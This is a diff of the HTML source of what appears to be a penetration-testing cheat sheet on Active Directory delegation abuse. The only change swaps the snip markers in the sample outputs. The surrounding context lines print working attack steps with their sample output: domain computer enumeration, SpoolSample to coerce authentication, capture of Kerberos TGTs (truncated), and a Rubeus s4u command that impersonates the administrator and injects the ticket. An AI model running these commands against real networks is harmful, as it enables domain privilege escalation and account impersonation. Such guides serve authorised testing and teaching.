@@ -178,7 +178,7 @@
 TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainComputer
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainComputer
-</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">logoncount                    : 131
 </span></span></span><span class="line"><span class="cl"><span class="go">badpasswordtime               : 12/31/1600 4:00:00 PM
@@ -218,7 +218,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">name                          : SRV002
 </span></span></span><span class="line"><span class="cl"><span class="go">dnshostname                   : srv002.Example.local
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---[SNIP]---
 </span></span></span></div></pre></div><h4 id="2-spoolsample">2. SpoolSample</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run multiple <span class="nb">times</span>
 </span></span><span class="line"><span class="cl"><span class="go">.\SpoolSample.exe <span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> <span class="o editable-keyword">&lt;CURRENT_DOMAIN&gt;</span>
@@ -257,7 +257,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
 </span></span></span><span class="line"><span class="cl"><span class="go">  Base64EncodedTicket   :
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ---[SNIP]--- guTE9DQUw=
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
@@ -269,7 +269,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
 </span></span></span><span class="line"><span class="cl"><span class="go">  Base64EncodedTicket   :
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ---[SNIP]--- guTE9DQUw=
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
@@ -281,13 +281,13 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
 </span></span></span><span class="line"><span class="cl"><span class="go">  Base64EncodedTicket   :
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ---[SNIP]--- guTE9DQUw=
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Ticket cache size: 3
 </span></span></span></div></pre></div><h4 id="4-impersonate">4. Impersonate</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /impersonateuser:administrator /ticket:<span class="o editable-keyword">&lt;BASE64_TICKET&gt;</span> /altservice:cifs/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> /self /ptt
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFqjCCBa...[SNIP]...guTE9DQUw= /altservice:cifs/srv001.example.local /self /ptt /nowrap
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFqjCCBa---[SNIP]---guTE9DQUw= /altservice:cifs/srv001.example.local /self /ptt /nowrap
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
 </span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
@@ -310,7 +310,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for 'administrator' to 'cifs@example.LOCAL'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGMDCCBi...[SNIP]...5sb2NhbA==
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGMDCCBi---[SNIP]---5sb2NhbA==
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Ticket successfully imported!
 </span></span></span></div></pre></div><h4 id="5-check">5. Check</h4>
